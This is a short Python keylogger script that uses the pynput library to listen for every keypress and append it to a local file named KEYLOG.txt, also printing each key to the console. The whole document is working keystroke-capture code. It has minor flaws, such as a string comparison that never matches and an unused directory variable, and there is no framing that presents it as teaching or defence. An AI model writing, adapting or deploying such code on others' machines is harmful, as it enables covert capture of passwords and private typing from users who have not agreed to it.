from pynput.keyboard import Key, Listener
import os

def on_press(key):
        print(str(key))
        if key == 'u\'u\'':
                key = 'u'
        if key == Key.space:
                key = ' '
        if key == Key.delete:
                key = ' (deleted)'
        foo = str(key)
        dirpath = os.path.dirname(os.path.realpath(__file__))
        f = open('KEYLOG.txt', 'r')
        text = f.read()
        f.close()
        newkey = foo.replace('u\'', '')
        newkey = newkey.replace('\'', '')
        text = text + newkey
        f = open('KEYLOG.txt', 'w')
        f.write(text)
        f.close()

with Listener(on_press=on_press) as listener:
        listener.join()
        
